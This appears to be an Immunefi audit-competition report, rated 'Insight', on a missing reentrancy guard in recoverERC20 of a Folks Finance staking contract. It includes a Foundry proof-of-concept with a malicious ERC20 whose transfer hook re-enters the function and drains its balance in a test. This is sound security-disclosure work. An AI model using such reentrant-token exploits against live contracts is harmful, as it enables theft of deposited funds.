# 68906 sc insight missing reentrancy guard on function recovererc20&#x20;

**Submitted on Mar 11th 2026 at 21:53:23 UTC by @Afriauditor for** [**Audit Comp | Folks Finance: Staking Contracts**](https://immunefi.com/audit-competition/audit-comp-folks-finance-staking-contracts)

* **Report ID:** #68906
* **Report Type:** Smart Contract
* **Report severity:** Insight
* **Target:** <https://github.com/Folks-Finance/folks-staking-contracts/blob/main/src/Staking.sol>

## Description

## Brief/Intro

The `recoverERC20` function in `Staking.sol` lacks the `nonReentrant` modifier, unlike every other state-changing function that performs external token transfers (`stake, stakeWithPermit, withdraw, migratePositionsFrom`). When the manager recovers a non-staking ERC20 token that contains a transfer callback (e.g., ERC-777 tokens, or any malicious token with a hook), the receiving address can re-enter `recoverERC20` before the first invocation completes.

## Vulnerability Details

Every external function in Staking.sol that performs a token transfer is protected by `nonReentrant` — except `recoverERC20`. This function performs no state changes before calling `safeTransfer`, so if the recovered token has a transfer callback (ERC-777 or malicious hook), the receiving address can re-enter `recoverERC20` repeatedly within a single transaction. For non-staking tokens the balance guard is skipped entirely, allowing full drain. For the staking token, the `balanceOf` check offers incidental protection, but this relies on the token decrementing its balance before the callback fires — an assumption that may not hold for all implementations. The manager does not need to be compromised; they simply need to recover a callback-enabled token, and the token itself becomes the attacker.

## Impact Details

The absence of a `nonReentrant` modifier on `recoverERC20` creates an inconsistent security posture that leaves the only admin-facing transfer function unprotected against the same reentrancy risk that every user-facing transfer function explicitly guards against.

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import {ERC20} from "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import {Staking} from "../src/Staking.sol";
import {IStakingV1} from "../src/interfaces/IStakingV1.sol";
import {Test} from "forge-std/Test.sol";

/// @dev Malicious ERC20 that reenters recoverERC20 on transfer
contract MaliciousToken is ERC20 {
    address public target;
    uint256 public reentrancyCount;
    uint256 public maxReentrancy;

    constructor() ERC20("Malicious", "MAL") {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    function setAttack(address _target, uint256 _maxReentrancy) external {
        target = _target;
        maxReentrancy = _maxReentrancy;
    }

    function transfer(address to, uint256 amount) public override returns (bool) {
        super.transfer(to, amount);

        // Reenter recoverERC20 on each transfer until max depth
        if (reentrancyCount < maxReentrancy) {
            reentrancyCount++;
            Staking(target).recoverERC20(address(this), amount);
        }

        return true;
    }
}

contract ReentrancyPOC is Test {
    Staking public staking;
    MaliciousToken public malToken;
    ERC20 public stakingToken;

    address admin = address(1);
    address manager = address(this); // test contract is the manager (receives tokens)
    address pauser = address(3);

    function setUp() public {
        stakingToken = new ERC20("Staking", "STK");
        staking = new Staking(admin, address(this), pauser, address(stakingToken));

        malToken = new MaliciousToken();
        // Simulate 100 tokens "accidentally" sent to the staking contract
        malToken.mint(address(staking), 100 ether);
    }

    function test_ReentrancyDrain() public {
        // Manager intends to recover only 10 tokens
        uint256 intendedRecovery = 10 ether;

        // Set up the attack: reenter 9 more times (10 x 10 = 100 tokens drained)
        malToken.setAttack(address(staking), 9);

        uint256 contractBalanceBefore = malToken.balanceOf(address(staking));
        uint256 managerBalanceBefore = malToken.balanceOf(address(this));

        assertEq(contractBalanceBefore, 100 ether);
        assertEq(managerBalanceBefore, 0);

        // Manager calls recoverERC20 for just 10 tokens
        staking.recoverERC20(address(malToken), intendedRecovery);

        uint256 contractBalanceAfter = malToken.balanceOf(address(staking));
        uint256 managerBalanceAfter = malToken.balanceOf(address(this));

        // All 100 tokens drained instead of just 10
        assertEq(contractBalanceAfter, 0);
        assertEq(managerBalanceAfter, 100 ether);

        emit log_named_uint("Intended recovery", intendedRecovery);
        emit log_named_uint("Actual drained", managerBalanceAfter);
    }
}
```
